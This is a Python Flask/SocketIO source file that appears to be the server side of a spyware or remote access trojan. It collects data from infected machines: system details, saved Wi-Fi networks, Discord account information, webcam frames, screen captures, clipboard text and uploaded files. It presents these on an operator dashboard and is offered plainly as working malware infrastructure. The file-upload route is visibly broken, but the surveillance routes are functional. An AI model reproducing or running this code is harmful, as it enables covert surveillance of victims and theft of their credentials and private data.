from flask import Flask, request, Response, render_template
from flask_socketio import SocketIO, emit

import cv2
import numpy as np
from random import randint
import base64
import os
import io

app = Flask(__name__)
app.config['SECRET_KEY'] = 'NeverGonnaGiveYouUp+_#+_($_*)'
socketio = SocketIO(app)

last_frame = {}
screen_last_frame = {}
clients = {}

def uuid_to_client(client_id):
	for key, value in clients.items():
		if str(value.get('clientId')) == str(client_id):
			return key

@app.route('/', methods=['GET'])
def mainSite():
	return render_template('main.html', clients = clients, Maxclients = len(clients))

@app.route('/client/<int:clientId>', methods=['GET'])
def client1(clientId):
	clientid = uuid_to_client(clientId)
	systemInfo = clients[clientid]["systemInfo"]
	wifis = clients[clientid]["wifis"]
	discordinfo = clients[clientid]["discordInfo"]
	return render_template(f'client.html', clientId = clientId, systeminfo=systemInfo, Wifis=wifis, Discordinfo=discordinfo)

@app.route('/client', methods=['GET', 'POST'])
def regclient():
	global clients

	if request.method == 'POST':
		json = request.json
		if not json['uuid'] in clients:
			clientId = randint(1000,9999)
			clients[json['uuid']] = {"clientId": clientId,"systemInfo": json['osInfo'],"clientClipboard": "", "wifis": json['wifis'], "discordInfo": json['discordInfo']}
			print(clients[json['uuid']])
		else:
			clientId = clients[json['uuid']]['clientId']
			print(f"{clients[json['uuid']]} arleady in clients!")

		return Response(str(clientId))

	if request.method == 'GET':
		return f"There are {len(clients)} clients online"

@app.route("/debug", methods=['GET'])
def debugpage():
	return f"Client: {clients}"


@socketio.on('send_camera')
def send_camera(json):
	clientId = json['clientId']
	image = json['image']
	last_frame[clientId] = image
	return Response(status=200)


@app.route('/get_camera_frame', methods=['GET'])
def get_camera_frame():
	if last_frame[request.args.get('id')]:
		response = Response(io.BytesIO(last_frame[request.args.get('id')]), mimetype='image/jpeg')
		response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
		return response
		#return Response(io.BytesIO(screen_last_frame[request.args.get('id')]), mimetype='image/png', max_age=0)
	else:
		return 'No camera image'


@socketio.on('send_screen')
def send_screen(json):
	clientId = json['clientId']
	image = json['image']
	screen_last_frame[clientId] = image
	return Response(status=200)

@app.route('/get_screen_frame', methods=['GET'])
def get_screen():
	if screen_last_frame[request.args.get('id')]:
		response = Response(io.BytesIO(screen_last_frame[request.args.get('id')]), mimetype='image/jpeg')
		response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
		return response
		#return Response(io.BytesIO(screen_last_frame[request.args.get('id')]), mimetype='image/png', max_age=0)
	else:
		return 'No screen image'


@socketio.on('clipboard')
def send_clipboard(json):
	clientId = json['clientId']
	clientid = uuid_to_client(clientId)
	message = json['text']
	if clientid in clients:
		clipboard = clients[clientid]['clientClipboard']
		clients[clientid]['clientClipboard'] = clipboard + message
	else:
		pass

@app.route('/get_clipboard', methods=['GET'])
def get_console():
	clientId = request.args.get('id')
	clientid = uuid_to_client(clientId)
	if clientid in clients:
		console = clients[clientid]['clientClipboard']
		return console
	else:
		return f"id {clientId} not in clients!"


@app.route('/upload', methods=['POST'])
def upload_file():
	if 'file' not in request.files:
		print(request.files)
		return "No file part"
	if 'uuid' in request.json:
		return "No uuid"
	file = request.files['file']
	if file.filename == '':
		return "No file name specified"

	uuid = request.json['uuid']
	filename = secure_filename(file.filename)

	os.path.join('upload', uuid, filename)
	return "File uploaded successfully"


if __name__ == '__main__':
	#app.run(host='0.0.0.0', port=5000, debug=True)
	socketio.run(app, host='0.0.0.0', port=20075)